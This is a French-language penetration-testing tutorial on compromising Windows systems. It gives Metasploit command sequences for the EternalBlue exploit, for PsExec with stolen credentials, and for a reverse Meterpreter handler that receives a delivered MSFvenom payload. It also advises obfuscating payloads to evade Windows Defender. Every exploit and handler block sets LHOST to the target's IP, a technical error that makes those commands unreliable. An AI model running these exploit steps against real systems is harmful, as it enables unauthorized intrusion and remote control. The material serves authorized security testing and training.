# Infiltration Windows

## Pourquoi

Windows domine les environnements d'entreprise. Active Directory, serveurs IIS, postes de travail : la surface d'attaque est immense. Entre 2019 et 2024, plus de 3600 vulnerabilites ont ete recensees dans les produits Microsoft. Certaines, comme EternalBlue ou PrintNightmare, ont eu un impact majeur. Savoir identifier et exploiter un systeme Windows est une competence essentielle.

## Comment ca marche

### Fingerprinting Windows

Plusieurs indicateurs permettent d'identifier un systeme Windows :

**TTL ICMP :** Windows repond generalement avec un TTL de 128 (contre 64 pour Linux).

```bash
ping <IP_CIBLE>
# ttl=128 -> probable Windows
```

**Ports typiques :**

| Port | Service |
|---|---|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |
| 3389 | RDP |
| 5985/5986 | WinRM |

**Scan Nmap :**

```bash
sudo nmap -v -O <IP_CIBLE>
```

### Vulnerabilites Windows historiques

| Nom | CVE | Description |
|---|---|---|
| MS08-067 | CVE-2008-4250 | RCE via SMB (Conficker) |
| EternalBlue | MS17-010 | RCE via SMBv1 (WannaCry, NotPetya) |
| BlueKeep | CVE-2019-0708 | RCE via RDP |
| PrintNightmare | CVE-2021-34527 | RCE via le spooler d'impression |
| Zerologon | CVE-2020-1472 | Bypass d'authentification Netlogon |
| SeriousSAM | CVE-2021-36934 | Lecture non autorisee de la base SAM |

### Formats de payloads Windows

| Format | Usage |
|---|---|
| `.exe` | Executable standard |
| `.dll` | Bibliotheque dynamique (injection, DLL hijacking) |
| `.bat` | Script batch DOS |
| `.ps1` | Script PowerShell |
| `.msi` | Installeur Windows |
| `.vbs` | Script VBScript |

## En pratique

### Exploitation EternalBlue (MS17-010)

**Verification de la vulnerabilite :**

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 > set RHOSTS <IP_CIBLE>
msf6 > run
```

**Exploitation :**

```bash
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 > set RHOSTS <IP_CIBLE>
msf6 > set LHOST <IP_CIBLE>
msf6 > set LPORT 4444
msf6 > exploit
```

En cas de succes, une session Meterpreter SYSTEM s'ouvre.

### Exploitation via SMB/PsExec (avec identifiants)

Quand on dispose d'identifiants valides :

```bash
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <IP_CIBLE>
msf6 > set SMBUser utilisateur
msf6 > set SMBPass motdepasse
msf6 > set LHOST <IP_CIBLE>
msf6 > exploit
```

### Livraison de payload personnalise

Generer un payload avec MSFvenom, le transferer sur la cible (via SMB, HTTP, email), puis le faire executer. Le handler Metasploit attend la connexion :

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <IP_CIBLE>
msf6 > set LPORT 4444
msf6 > exploit
```

## Pieges et galeres

- Windows Defender detecte la majorite des payloads MSFvenom standards. En environnement securise, il faut encoder, obfusquer ou utiliser des outils alternatifs.
- EternalBlue est ancien mais toujours present sur des systemes non patches (Windows 7, Server 2008/2012).
- L'execution d'un exploit comme MS17-010 peut provoquer un crash (BSOD) si les conditions ne sont pas reunies. Toujours avoir l'accord du client avant d'utiliser des exploits a risque.
- PsExec necessite des identifiants avec des privileges administrateur.

## Retour terrain

En mission interne, l'exploitation de Windows passe souvent par la reutilisation d'identifiants (password spraying, pass-the-hash) plutot que par des exploits directs. Les failles de type EternalBlue sont de plus en plus rares sur des systemes maintenus. En revanche, les serveurs IIS exposant des applications web avec des failles d'upload ou d'injection restent une cible frequente.

## Memo express

| Action | Commande |
|---|---|
| Fingerprint OS | `sudo nmap -v -O <IP>` |
| Check EternalBlue | `auxiliary/scanner/smb/smb_ms17_010` |
| Exploit EternalBlue | `exploit/windows/smb/ms17_010_psexec` |
| PsExec avec creds | `exploit/windows/smb/psexec` + SMBUser/SMBPass |
| Handler reverse | `exploit/multi/handler` + payload |

***
